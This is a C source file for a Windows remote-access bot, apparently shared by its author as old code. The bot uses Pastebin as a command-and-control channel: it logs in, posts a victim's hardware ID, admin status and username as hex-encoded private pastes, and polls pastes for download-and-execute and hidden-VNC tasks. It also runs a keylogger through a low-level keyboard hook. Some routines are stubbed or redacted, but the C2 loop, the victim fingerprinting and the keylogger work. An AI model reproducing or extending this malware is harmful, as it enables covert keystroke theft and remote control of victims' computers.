// im really lazy to upload the other part since there were like 3 versions of this bullshit
// this is really old and yea nvfm
#include <windows.h>
#include <WinInet.h>
#include <stdio.h>
#include "main.h"
#pragma comment(lib, "wininet.lib")
#define CHUNKSIZE 1024

BOOL HttpPost(PCHAR lpszDomain, PCHAR lpszPage, PCHAR lpszData, DWORD dwData, PCHAR *lpszDest, PDWORD pdwDest)
{
	// removed code
	return TRUE;
}
BOOL FetchUserCommandData(PCHAR g_lpszUserKey, PCHAR *lpszPasteKey, PDWORD pdwPasteKey) {
	//Listing Pastes Created By A User then looks for a public paste, the public paste will have command data.
	BOOL status = FALSE;
	DWORD dwPostData = strlen(g_lpszUserKey) + strlen(LIST) + strlen(API_DEV_KEY) + strlen(PostParams[api_option].lpszPostParam) + strlen(PostParams[api_user_key].lpszPostParam) + strlen(PostParams[api_dev_key].lpszPostParam);
	PCHAR lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwPostData + 1), lpszReadData = NULL;
	
	if (!lpszPostData)
		goto cleanup;

	_ZeroMemory(lpszPostData, dwPostData + 1);

	DWORD dwBytesRead = 0;
	wsprintfA(lpszPostData, "%s%s%s%s%s%s", PostParams[api_dev_key].lpszPostParam, API_DEV_KEY, PostParams[api_user_key].lpszPostParam, g_lpszUserKey, PostParams[api_option].lpszPostParam, LIST);
	status = HttpPost(URL, Urls[CREATE_NEW_PASTE].lpszPage, lpszPostData, dwPostData, &lpszReadData, &dwBytesRead);
	if (!lpszReadData)
		goto cleanup;

	DWORD dwIndex = 0, dwPasteKeyStart = 0, dwPasteKeyEnd = 0, dwPastePrivateStart = 0, dwExtra = PASTE_KEY_LENGTH;
	BOOL bFoundPasteKey = FALSE, bFoundEndPasteKey = FALSE, bFoundPrivatePasteStart = FALSE, bIsPrivate = FALSE;
	while ((dwIndex + dwExtra) < dwBytesRead) {
	
		if (!bFoundPasteKey) {
			if (!_memcmp(lpszReadData + dwIndex, "<paste_key>", PASTE_KEY_LENGTH)) {
				bFoundPasteKey = TRUE;
				puts("paste key");

				dwPasteKeyStart = (dwIndex + PASTE_KEY_LENGTH);
				dwIndex++;
				dwExtra = PASTE_END_KEY_LENGTH;
				continue;
			}
		}

		if (bFoundPasteKey) {
			if (!_memcmp(lpszReadData + dwIndex, "</paste_key>", PASTE_END_KEY_LENGTH)) {
				bFoundEndPasteKey = TRUE;
				dwPasteKeyEnd = dwIndex;
				dwIndex++; 
				puts("paste key2");

				dwExtra = PRIVATE_PASTE_LENGTH;
				continue;
			}
		}

		if (bFoundEndPasteKey) {
			if (!_memcmp(lpszReadData + dwIndex, "<paste_private>", PRIVATE_PASTE_LENGTH)) {
				bFoundPrivatePasteStart = TRUE;
				dwPastePrivateStart = dwIndex;
				puts("paste_private");

				dwIndex+= PRIVATE_PASTE_LENGTH;
				continue;
			}
		}
		if (bFoundPrivatePasteStart) {
			printf("lpszReadData + dwIndex %c\n", lpszReadData[dwIndex]);
			if (lpszReadData[dwIndex] == '0'){
				puts("is 0?");

				bIsPrivate = TRUE;
				break;
			}
			bFoundPasteKey = FALSE;
			bFoundPrivatePasteStart = FALSE;
			bFoundEndPasteKey = FALSE;
			dwPasteKeyStart = 0;
			dwPasteKeyEnd = 0;
			dwPastePrivateStart = 0;
		}

		dwIndex++;
	}
	if (bIsPrivate && bFoundPrivatePasteStart) {
		*lpszPasteKey = HeapAlloc(GetProcessHeap(), 0, (dwPasteKeyEnd - dwPasteKeyStart) + 1);
		if (!*lpszPasteKey)
			goto cleanup;

		_ZeroMemory(*lpszPasteKey, (dwPasteKeyEnd - dwPasteKeyStart) + 1);
		_memcpy(*lpszPasteKey, lpszReadData + dwPasteKeyStart, dwPasteKeyEnd - dwPasteKeyStart);
		*pdwPasteKey = dwPasteKeyEnd - dwPasteKeyStart;
		status = TRUE;
	}
cleanup:
	if (lpszReadData) {
		HeapFree(GetProcessHeap(), 0, lpszReadData);
		lpszReadData = NULL;
	}
	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;
	}
	return status;
}

BOOL FetchRawPaste(PCHAR g_lpszUserKey, PCHAR lpszPasteKey, DWORD dwPasteKey, PCHAR *lpszDest) {
	BOOL status = FALSE;
	DWORD dwPostData = strlen(API_DEV_KEY) + strlen(g_lpszUserKey) + strlen(OPTION) +  strlen(PostParams[api_user_key].lpszPostParam) +
		strlen(PostParams[api_dev_key].lpszPostParam) + strlen(PostParams[api_option].lpszPostParam) + strlen(PostParams[api_paste_key].lpszPostParam) + dwPasteKey, dwBytesRead = 0;;

	PCHAR lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwPostData  +50+ 1);
	
	if (!lpszPostData)
		goto cleanup;
	_ZeroMemory(lpszPostData, dwPostData + 50 +1);
	wsprintfA(lpszPostData, "%s%s%s%s%s%s%s%s", PostParams[api_dev_key].lpszPostParam, API_DEV_KEY, PostParams[api_user_key].lpszPostParam, g_lpszUserKey, PostParams[api_option].lpszPostParam, OPTION, PostParams[api_paste_key].lpszPostParam, lpszPasteKey);
	status = HttpPost(URL, Urls[RAW_OUTPUT_PRIVATE].lpszPage, lpszPostData, strlen(lpszPostData), lpszDest, &dwBytesRead);
cleanup:
	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;
	}
	return status;
}
BOOL CreateNewPaste(PCHAR g_lpszUserKey, LPSTR lpszPasteCode, DWORD dwPasteCode, LPSTR lpszPasteName, PasteType Paste) {
	BOOL status = FALSE;
	DWORD dwPostData = strlen(PostParams[api_option].lpszPostParam) + strlen(PostParams[api_dev_key].lpszPostParam) + strlen(PostParams[api_paste_code].lpszPostParam) + strlen(API_DEV_KEY) + strlen(OPTION) + dwPasteCode + strlen(PostParams[api_paste_key].lpszPostParam) + strlen(g_lpszUserKey)+ strlen(PostParams[api_paste_name].lpszPostParam) + strlen(lpszPasteName) + strlen(PostParams[api_paste_private].lpszPostParam) + 4;

	PCHAR lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwPostData + 1), lpszReadData = NULL;
	DWORD dwBytesRead = 0;
	if (!lpszPostData)
		goto cleanup;

	_ZeroMemory(lpszPostData, dwPostData+1);
	wsprintfA(lpszPostData, "%s%s%s%s%s%s%s%s%s%s%s%d",
		PostParams[api_dev_key].lpszPostParam, API_DEV_KEY,
		PostParams[api_option].lpszPostParam, PASTE,
		PostParams[api_paste_code].lpszPostParam, lpszPasteCode,
		PostParams[api_user_key].lpszPostParam, g_lpszUserKey,
		PostParams[api_paste_name].lpszPostParam, lpszPasteName,
		PostParams[api_paste_private].lpszPostParam, Paste);
	
	status = HttpPost(URL, Urls[CREATE_NEW_PASTE].lpszPage, lpszPostData, strlen(lpszPostData), &lpszReadData, &dwBytesRead);
	printf("lpszPostData %s\n", lpszPostData);
	printf("lpszReadData %s\n", lpszReadData);
cleanup:

	if (lpszReadData) {
		HeapFree(GetProcessHeap(), 0, lpszReadData);
		lpszReadData = NULL;

	}
	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;

	}
	return status;
}
BOOL IsBadRequest(PCHAR lpszData, DWORD dwData) {
	BOOL bIsBad = FALSE;
	if (dwData >= 15) {
		bIsBad = (!_memcmp(lpszData, "Bad API request", 15));
	}
	return bIsBad;
}

BOOL PasteBinLogin(PCHAR *g_lpszUserKey) {
	DWORD dwPostData = strlen(API_DEV_KEY) + strlen(API_USERNAME) + strlen(API_PASSWORD) + strlen(PostParams[api_dev_key].lpszPostParam) + strlen(PostParams[api_user_name].lpszPostParam)+ strlen(PostParams[api_user_password].lpszPostParam);
	BOOL status = FALSE;
	PCHAR lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwPostData + 1);
	if (!lpszPostData)
		goto cleanup;

	_ZeroMemory(lpszPostData, dwPostData + 1);
	wsprintfA(lpszPostData, "%s%s%s%s%s%s", PostParams[api_dev_key].lpszPostParam, API_DEV_KEY, PostParams[api_user_name].lpszPostParam, API_USERNAME, PostParams[api_user_password].lpszPostParam, API_PASSWORD);
	DWORD dwBytesRead = 0;
	printf("lpszPostData : %s\n", lpszPostData);
	status = HttpPost(URL, Urls[LOGIN].lpszPage, lpszPostData, dwPostData, g_lpszUserKey, &dwBytesRead);
	printf("g_lpszUserKey %s\n", *g_lpszUserKey);

cleanup:
	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;
	}
	return status;
}
/*
* Upon returning true it returns a valid pointer to an allocated buffer holding the HWID. this must be later freed
* upon returning false, lpszHWID points to null
*/
BOOL GetHwid(PCHAR *lpszHwid, PDWORD pdwHwid) {
	BOOL status = FALSE;
	HW_PROFILE_INFOA hwProfileInfoW;
	if (!GetCurrentHwProfileA(&hwProfileInfoW))
		goto cleanup;

	DWORD dwHwidSize = (_strlen(hwProfileInfoW.szHwProfileGuid) +1);
	if (dwHwidSize <= 0)
		goto cleanup;

	
	*lpszHwid = HeapAlloc(GetProcessHeap(), 0, dwHwidSize);
	if (!*lpszHwid)
		goto cleanup;

	_ZeroMemory(*lpszHwid, dwHwidSize);
	_memcpy(*lpszHwid, hwProfileInfoW.szHwProfileGuid, dwHwidSize);
	*pdwHwid = dwHwidSize;
	status = TRUE;
cleanup:
	return status;
}
/*
* Queries whether the EXE is running with administrator rights. returns FALSE upon a function fail. returns TRUE upon success of query.  
*/
BOOL QueryAdminStatus(PBOOL bAdminStatus) {
	// removed code
	return FALSE;
}
BOOL MeltFile() {
	return FALSE;
}
BOOL RegisterStartupService(PCHAR lpszFilePath, PCHAR lpszServiceName) {
	return FALSE;
}
BOOL SubmitKeylogs(PPOST_DATA PostData) {
	return FALSE;
}
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {

	if (g_KeyloggerData->dwKeys >= KEYLOGGER_BUFFER_SIZE-1) {
		SubmitKeylogs(g_PostData);
	}
	KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
	switch (wParam) {
	case WM_KEYDOWN: {
		DWORD vk = data->vkCode;

		printf("g_KeyloggerData->dwKeys %d\n", g_KeyloggerData->dwKeys);
		BOOL isAlpha = IS_ALPHA_NUM(vk);
		switch (isAlpha) {

		case TRUE:
		{
			UINT k = MapVirtualKeyA(vk, MAPVK_VK_TO_CHAR);
			g_KeyloggerData->ucKeyloggerData[g_KeyloggerData->dwKeys] = k;
			g_KeyloggerData->dwKeys++;
		}
		break;
		INT dwLen = 0;
		case FALSE: {

		} //end false statemtns
		}//end switch
	}
		break;
	default:
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);

}
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
	HHOOK hhKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hhKeyboardHook);
	return 0;
}


BOOL RandomString(PCHAR *lpszRandomStr) {
	return FALSE;
}
HANDLE getfile(LPCSTR url, PBYTE *ppBuf, PDWORD pdwSize)
{
	return NULL;
}

BOOL StartupRun(PCHAR pszAppName, PCHAR pathToExe, PBOOL pbExists)
{
	return FALSE;
}

BOOL StartupMethod(BOOL bAdmin)
{
	CHAR szPathToExe[MAX_PATH];
	BOOL status = FALSE;
	GetModuleFileNameA(NULL, szPathToExe, MAX_PATH);
	if (bAdmin) {
		BOOL bExists = FALSE;
		status = StartupRun("Windows Service", szPathToExe, &bExists);

		if (bExists && !status)
			status = TRUE;
	}
	else {
		RegisterStartupService(szPathToExe, "Windows Service");
	}

	return status;
}

BOOL DownloadAndExecuteFile(PCHAR lpszFileName, PCHAR lpszFileUrl, BOOL bFileExists) {

	return FALSE;
}
DWORD WINAPI PostRoutine(LPVOID lpParam) {

	PCHAR lpszPostData = NULL, lpszPostDataReal = NULL;
	
	DWORD dwPostData = g_PostData->dwHwid + g_PostData->dwAdmin + 6 + g_PostData->dwRandom1 + g_PostData->dwRandom2 + g_PostData->dwRandom3 + g_PostData->dwUserAccount;
	DWORD dwBytesToAllocate = dwPostData + 1;
	lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwBytesToAllocate);
	if (!lpszPostData)
		goto cleanup;
	
	_ZeroMemory(lpszPostData, dwBytesToAllocate);
	wsprintfA(lpszPostData, "&%s=%s&%s=%s&%s=%s", g_PostData->lpszRandomParam1, g_PostData->lpszHwid, g_PostData->lpszRandomParam2, g_PostData->lpszAdmin, g_PostData->lpszRandomParam3, g_PostData->lpszUserAccount);
	printf("lpszPostData %s\n", lpszPostData);

	lpszPostDataReal = bytes_to_hex(lpszPostData, dwBytesToAllocate);

	DWORD dwPostDataReal = _strlen(lpszPostDataReal);
	printf("lpszPostDataReal %s\n", lpszPostDataReal);

	CreateNewPaste(g_PostData->g_lpszUserKey, lpszPostDataReal, dwPostDataReal, KNOCK, PRIVATE);

	
	for (;;) {
		PCHAR lpszData = NULL;
		PCHAR lpszPasteKey = NULL;
		DWORD dwPasteKey = 0;
		nx_json* json = NULL;
		printf("while loop");

		FetchUserCommandData(g_PostData->g_lpszUserKey, &lpszPasteKey, &dwPasteKey);
		
		printf("lpszPasteKey %s\n", lpszPasteKey);
		if (!lpszPasteKey)
			goto cleanup_read;

		FetchRawPaste(g_PostData->g_lpszUserKey, lpszPasteKey, dwPasteKey, &lpszData);
		if (!lpszData)
			goto cleanup_read;

		printf("lpszData %s\n", lpszData);

		json = nx_json_parse(lpszData, 0);
		if (!json)
			goto cleanup_read;

		const nx_json* arr = nx_json_get(json, "tasks");
		if (!arr)
			goto cleanup_read;

		for (int i = 0; i < arr->length; i++) {
			const nx_json* item = nx_json_item(arr, i);
			if (!item)
				continue;

			for (int z = 0; z < item->length; z++) {
				int command = (nx_json_item(item, z)->int_value);
				z++;
				BOOL Status = FALSE;
				switch (command) {
				case DOWNLOAD_EXECUTE:
					// redacted code to download
					z++;
					LPCSTR lpszUrl = nx_json_item(item, z)->key;
					z++;

					break;
				case START_HVNC:
					// redacted code
					z++;

					break;
				default: break;
				}
			}
			HeapFree(GetProcessHeap(), 0, item);
		}
	cleanup_read:

		if (lpszData) {
			HeapFree(GetProcessHeap(), 0, lpszData);
			lpszData = NULL;
		}
		if (lpszPasteKey) {
			HeapFree(GetProcessHeap(), 0, lpszPasteKey);
		}
		if (json) {
			HeapFree(GetProcessHeap(), 0, json);
			json = NULL;
		}
		Sleep(SLEEP_TIME);
	}
cleanup:
	
	if (lpszPostDataReal) {
		HeapFree(GetProcessHeap(), 0, lpszPostDataReal);
		lpszPostDataReal = NULL;
	}
	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;
	}

	return TRUE;
}
BOOL GetUserNameComp(PCHAR *lpszAcc, PDWORD pdwAcc) {
	BOOL status = FALSE;
	PCHAR lpszBuf = NULL;
	DWORD dwBytes = 0;
	GetUserNameA(lpszBuf, &dwBytes);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		*lpszAcc = HeapAlloc(GetProcessHeap(), 0, dwBytes);
		GetUserNameA(*lpszAcc, &dwBytes);
		*pdwAcc = (dwBytes - 1);
		status = TRUE;
	}
	return status;
}
void main() {
	BOOL status = FALSE;
	HMODULE hNtdll = LoadLibrary(L"Ntdll.dll");
	_RtlRandomEx = (__RtlRandomEx)GetProcAddress(hNtdll, "RtlRandomEx");

	_RtlGenRandom = (__RtlGenRandom)GetProcAddress(hNtdll, "RtlGenRandom");


/*	
	BOOL bIsAdmin = FALSE;

	status = QueryAdminStatus(&bIsAdmin);
	if (!status)
		goto cleanup;

	StartupMethod(bIsAdmin);
	*/

	g_KeyloggerData = HeapAlloc(GetProcessHeap(), 0, sizeof(KEYLOGGER_DATA));
	_ZeroMemory(g_KeyloggerData, sizeof(KEYLOGGER_DATA));
	g_PostData = HeapAlloc(GetProcessHeap(), 0, sizeof(POST_DATA));

	_ZeroMemory(g_PostData, sizeof(POST_DATA));
	
	status = GetHwid(&g_PostData->lpszHwid, &g_PostData->dwHwid);
	if (!status || !g_PostData->lpszHwid)
		goto cleanup;


	status = IsAdmin(&g_PostData->lpszAdmin, &g_PostData->dwAdmin);
	if (!status || !g_PostData->lpszAdmin)
		goto cleanup;


	status = RandomString(&g_PostData->lpszRandomParam1);
	if (!status || !g_PostData->lpszRandomParam1)
		goto cleanup;

	g_PostData->dwRandom1 = strlen(g_PostData->lpszRandomParam1);

	status = RandomString(&g_PostData->lpszRandomParam2);
	if (!status || !g_PostData->lpszRandomParam2)
		goto cleanup;

	g_PostData->dwRandom2 = strlen(g_PostData->lpszRandomParam2);


	status = RandomString(&g_PostData->lpszRandomParam3);
	if (!status || !g_PostData->lpszRandomParam3)
		goto cleanup;

	g_PostData->dwRandom3 = strlen(g_PostData->lpszRandomParam3);

	
	GetUserNameComp(&g_PostData->lpszUserAccount, &g_PostData->dwUserAccount);
	printf("g_PostData->lpszUserAccount %s\n", g_PostData->lpszUserAccount);
	
	PasteBinLogin(&g_PostData->g_lpszUserKey);
	
	//PostRoutine(NULL);
	HANDLE hPostThread = CreateThread(NULL, 0, PostRoutine, NULL, 0, NULL);
	HANDLE hKeyloggerThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
	WaitForSingleObject(hPostThread, INFINITE);
	WaitForSingleObject(hKeyloggerThread, INFINITE);

cleanup:
	getchar();
	;
}
